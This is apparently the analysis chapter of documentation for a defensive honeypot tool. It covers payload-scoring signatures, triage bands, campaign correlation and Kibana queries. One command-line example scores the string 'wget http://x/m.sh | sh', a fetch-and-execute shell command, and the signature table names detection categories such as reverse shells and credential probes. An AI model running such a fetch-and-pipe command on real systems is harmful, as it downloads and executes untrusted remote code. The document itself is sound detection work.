# Analysis

The analysis toolkit reads attack telemetry — from a capture file or from
Elasticsearch — and answers three questions: what behaviours appeared, which
sources were working together, and who was enumerating rather than attacking.

## Command line

```bash
deception-shield replay capture.pcap.gz        # dissect a capture and report
deception-shield replay ./captures/            # or a directory of them
deception-shield analyse --since 7d            # report on indexed telemetry
deception-shield score --text 'wget http://x/m.sh | sh'
deception-shield extract                       # run the extraction service
```

Both reporting commands take `--format json` for machine consumption and
`--min-score` to drop everything below a threshold.

## Payload scoring

Each payload is matched against a signature set. A signature carries a weight
reflecting how rarely that shape appears in benign traffic, matches are additive,
and the total is capped so that many weak matches cannot outrank one conclusive
match.

| Signature | Weight | Technique |
| --- | ---: | --- |
| `log4shell` | 45 | T1190 |
| `shell_pipe_execution` | 40 | T1059 |
| `reverse_shell` | 40 | T1059 |
| `iot_botnet_dropper` | 40 | T1105 |
| `webshell_upload` | 35 | T1505.003 |
| `encoded_powershell` | 35 | T1059.001 |
| `cve_probe_struts` | 35 | T1190 |
| `remote_payload_fetch` | 30 | T1105 |
| `command_injection` | 30 | T1059 |
| `xxe_attempt` | 30 | T1190 |
| `sql_injection` | 25 | T1190 |
| `credential_probe` | 20 | T1003 |
| `path_traversal` | 15 | T1083 |
| `scanner_fingerprint` | 5 | T1595 |

Payloads are percent-decoded before matching, so an encoded traversal matches the
same rule as a plain one, and both forms are searched because an attacker may
encode only part of a payload.

A payload that matches nothing but is largely unprintable is surfaced for
inspection rather than filed as benign: binary shellcode and malformed protocol
probes look like nothing in particular to a text rule.

## Triage bands

| Band | Score | Meaning |
| --- | --- | --- |
| `benign` | 0 | nothing matched |
| `noise` | 1-19 | scanner fingerprints and other background activity |
| `suspicious` | 20-49 | probing that warrants a look |
| `likely-malicious` | 50-79 | multiple attack shapes in one payload |
| `critical` | 80-100 | conclusive exploitation attempt |

## Campaign correlation

A behaviour profile is built for each source from the signatures it triggered and
the ports it touched. Two sources are linked when they share at least one
signature, their profiles overlap past the similarity threshold, and their
activity windows fall within six hours of each other. Links merge transitively,
so a chain of similar hosts forms one campaign.

Confidence combines three things: how alike the members are, how many of them
there are (on a log scale, so a hundred-member cluster is not rated fifty times
more confidently than a two-member one), and how specific the shared behaviour
is. A cluster held together by an exploitation attempt rates above one held
together by a shared scanner banner.

## Sweep detection

A source touching many distinct ports is enumerating rather than pursuing a
target, and is reported separately. The report includes ports per second, which
separates automated sweeps from someone working through services by hand.

## Kibana

The dashboard covers payload volume over time broken down by triage band, the
distribution across bands, the signatures observed, the ports drawing the most
traffic, source geography, and the credentials tried against the SSH and Telnet
honeypots.

Triage is coloured as an ordered ramp in a single hue rather than as independent
status colours, because the bands are a severity scale: depth reads as severity,
and the ordering carries meaning that four unrelated hues would not.

## Querying directly

```
# Everything conclusive in the last day
threat.triage: "critical" and @timestamp >= now-1d

# One source across every data source
source.ip: "203.0.113.10"

# Payloads that fetched something remote
threat.payload_signatures: "remote_payload_fetch"

# Successful logins to the SSH honeypot
event.dataset: "honeypot.session" and event.outcome: "success"
```

Shared field names across the three sources are what make the second query work:
one address matches its honeypot sessions, its IDS verdicts and its raw payloads
in a single search.
